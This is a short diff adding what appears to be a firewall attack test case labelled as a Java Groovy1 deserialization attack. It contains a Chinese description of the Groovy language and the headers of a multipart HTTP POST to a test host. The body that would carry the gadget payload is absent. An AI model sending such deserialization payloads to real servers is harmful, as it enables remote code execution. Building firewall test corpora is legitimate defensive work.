@@ -1,0 +1,10 @@
+# 反序列化-JAVA Groovy1
+# Groovy 是 Apache 旗下的一门基于 JVM 平台的动态/敏捷编程语言，在语言的设计上它吸纳了 Python、Ruby 和 Smalltalk 语言的优秀特性，语法非常简练和优美，开发效率也非常高（编程语言的开发效率和性能是相互矛盾的，越高级的编程语言性能越差，因为意味着更多底层的封装，不过开发效率会更高，需结合使用场景做取舍）。并且，Groovy 可以与 Java 语言无缝对接，在写 Groovy 的时候如果忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本，都可以很好的工作。
+POST /?acid=80001738&bid=hd_tag_m8mv25n9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25n9
+RM-PRO-Token: 15377fa13189dadd3bffac1c93332712
+RM-PRO-Time: 1742808483438
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=O7UME5xG5xDrRlup2mWBoygKneFpOGfv
+
